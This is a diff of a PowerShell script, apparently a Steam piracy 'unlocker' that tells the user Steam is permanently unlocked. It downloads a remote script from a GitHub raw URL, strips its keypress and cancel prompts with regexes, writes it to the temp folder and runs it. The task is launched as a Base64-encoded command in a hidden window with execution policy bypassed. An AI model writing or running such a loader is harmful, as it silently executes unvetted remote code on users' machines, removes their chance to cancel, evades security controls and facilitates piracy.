@@ -21,45 +21,53 @@ try {
         
         [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 a 2 minutos. Aguarde.", "Sucesso")
 
-        # Usando @' garante que o texto será injetado perfeitamente
+        # Usando @' para blindar as variáveis
         $bgTask = @'
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         
         try {
-            # Baixa script original EXATAMENTE como você me enviou
-            $rawScript = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
+            # 1. Baixa o script original
+            $raw = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
             
-            # --- O GRANDE VILÃO DO BACKGROUND ---
-            # Remove comandos de interface gráfica que "crasham" o terminal invisível
-            $s = $rawScript.Replace('$Host.UI.RawUI.WindowTitle', '#')
-            $s = $s.Replace('[Console]::OutputEncoding', '#')
-            $s = $s.Replace('chcp 65001', '#')
+            # 2. LIMPEZA TOTAL COM REGEX MULTILINHA (Destrói as linhas inteiras problemáticas)
+            # Remove UI que crasha o background
+            $s = $raw -replace '(?m)^.*Host\.UI\.RawUI.*$', ''
+            $s = $s -replace '(?m)^.*Console\]::OutputEncoding.*$', ''
+            $s = $s -replace '(?m)^.*chcp\s+65001.*$', ''
 
-            # --- BYPASS DO STEAMTOOLS E MILLENNIUM ---
-            # 1. Steamtools: Troca o ReadKey por Sleep de 2 seg
-            $s = $s.Replace('[void][System.Console]::ReadKey($true)', 'Start-Sleep -Seconds 2')
-            
-            # 2. Millennium: Ignora cancelamento de tecla e zera o timer
-            $s = $s.Replace('[Console]::KeyAvailable', '$false')
-            $s = $s.Replace('$milleniumTimer = 5', '$milleniumTimer = 0')
+            # Destrói a linha do Steamtools inteira e coloca a pausa no lugar
+            $s = $s -replace '(?m)^.*ReadKey.*$', 'Start-Sleep -Seconds 2'
 
-            # Executa a instalação na memória com todos os bypasses aplicados
-            Invoke-Expression $s
+            # Bypass do Millennium
+            $s = $s -replace '\[Console\]::KeyAvailable', '$false'
+            $s = $s -replace '\$milleniumTimer\s*=\s*\d+', '$milleniumTimer = 0'
 
-            # Baixa o aviso e abre no notepad
+            # 3. SALVA EM ARQUIVO FÍSICO (A Grande Mudança!)
+            # Em vez de Invoke-Expression, criamos um script real na pasta temporária.
+            $tempScript = "$env:TEMP\Steam_AutoInstall.ps1"
+            $s | Set-Content -Path $tempScript -Encoding UTF8 -Force
+
+            # Executa o script de forma nativa e limpa
+            & $tempScript
+
+            # Baixa e mostra o aviso
             $wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
             $path = "$env:TEMP\warning.txt"
             (New-Object System.Net.WebClient).DownloadFile($wUrl, $path)
             Start-Process notepad.exe $path
             
         } catch {
-            # Falha silenciosa em background
+            # SE FALHAR, ABRE O BLOCO DE NOTAS COM O ERRO EXATO!
+            $errorMsg = "ERRO FATAL NO BACKGROUND:`r`n$($_.Exception.Message)`r`n`r`nVerifique o script original do GitHub."
+            $errorPath = "$env:TEMP\Steam_Erro_Background.txt"
+            $errorMsg | Set-Content -Path $errorPath -Force
+            Start-Process notepad.exe $errorPath
         }
 '@
 
         $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
         
-        # Dispara o processo em background (Adicionado ExecutionPolicy Bypass para evitar bloqueios extras de segurança)
+        # Dispara o processo em background
         Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy Bypass", "-WindowStyle Hidden", "-EncodedCommand", $encoded -WindowStyle Hidden
         
         exit
